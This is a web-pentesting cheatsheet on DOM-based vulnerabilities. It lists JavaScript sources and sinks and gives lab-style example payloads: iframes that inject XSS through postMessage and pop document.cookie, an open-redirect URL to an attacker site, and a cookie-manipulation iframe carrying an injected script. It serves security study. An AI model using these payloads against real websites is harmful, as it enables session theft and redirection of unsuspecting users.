---
title: "DOM-based vulnerabilities"
subtitle: ""
draft: false
author: "Hato0"
description: "DOM-based vulnerabilities cheatsheet"
Last Update: <time datetime="{{ .Page.Lastmod.Format "Mon Jan 10 17:13:38 2020 -0700" }}" class="text-muted">  {{ $.Page.Lastmod.Format "January 02, 2006" }} </time>
Date: 2022-06-20

tags: ["web", "penetest", "dom-based"]
categories: ["Penetest - Web"]

hiddenFromHomePage: true
hiddenFromSearch: false
twemoji: false
lightgallery: false
ruby: false
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false
toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
share:
  enable: true
comment:
  enable: true
---
# DOM-based vulnerabilities

DOM-based vulnerabilities are based on javascript values controlled by attackers *called source* and use it in dangerous functions *called sink* (values can be cookies or whatever and functions can be eval like ones so by modifying the cookie you've got RCE).

Sources are very often :
- document.URL  
- document.documentURI  
- document.URLUnencoded  
- document.baseURI  
- location  
- document.cookie  
- document.referrer  
- window.name  
- history.pushState  
- history.replaceState  
- localStorage  
- sessionStorage  
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)  
- Database

Sink related to vulnerabilites are (thanks to portswigger):

DOM-based vulnerability | Example sink
:----: | :----:
DOM XSS  | `document.write()`
Open redirection | `window.location`
Cookie manipulation | `document.cookie`
JavaScript injection | `eval()`
Document-domain manipulation | `document.domain`
WebSocket-URL poisoning | `WebSocket()`
Link manipulation | `someElement.src`
Web-message manipulation | `postMessage()`
Ajax request-header manipulation | `setRequestHeader()`
Local file-path manipulation | `FileReader.readAsText()`
Client-side SQL injection | `ExecuteSql()`
HTML5-storage manipulation | `sessionStorage.setItem()`
Client-side XPath injection | `document.evaluate()`
Client-side JSON injection | `JSON.parse()`
DOM-data manipulation | `someElement.setAttribute()`
Denial of service | `RegExp()`


There is also DOM clobbering, same goal, different approach, your goal here is to inject HTML and then perform DOM basis

## Some examples



- Web messages
	
	Here you are in the situation where your page contained an `addEventListener` and wait for an input
	
	You can put the following message: 
	
	{{< highlight html "lineNos=false" >}}
	<iframe src="WEBSITE" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','\*')">
	{{< /highlight >}}
	
	OR
	
	{{< highlight html "lineNos=false" >}}
	<iframe src="WEBSITE" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','\*')">
	{{< /highlight >}}
	
	OR 
	
	{{< highlight html "lineNos=false" >}}<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:alert(document.cookie)\\"}","\*")'>
	{{< /highlight >}}
	
	Base your payload on the method use to upload a message.
	
	The iframe will post the message and dump it on the page, you will be able to get the cookie that way
	

- DOM-based open redirection

	The website have a similar output than the following one :
	
	{{< highlight html "lineNos=false" >}}
	<a href='#' onclick='returnURL' = /url=https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl\[1\];else location.href = "/"'>Back to Blog</a>
	{{< /highlight >}}
	 
	 So you can use it by sending for example the following url :
	 
	 `https:/WEBSITE/post?postId=4&url=YOURWEBSITE`
	 
	 
- DOM-based cookie manipulation

	Here is an example for the following scenario :
	1. You are on a website that store last page seen as a cookie
	
	2. Your first action is to inject an iframe where you match an existing page and add some payload after it.
	
	3. When the iframe is load by the victime browser, it will open the src temporarily and set the cookie to the payload

	4. Then the iframe will execute the `onload` function and redirect the victime to an other page of your choice. 

	5. By loading the page the cookie will be stored and execute so is your payload, the victime is not able to see it in anyway (if your victime is Mr/Mrs Michu)
	
	{{< highlight html "lineNos=false" >}}
	<iframe src="WEBSITE/sell?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='WEBSITE';window.x=1;">
	{{< /highlight >}}
	
## How to prevent it 
Not much to do. Just handle untrusted data carefully and perform all required checks.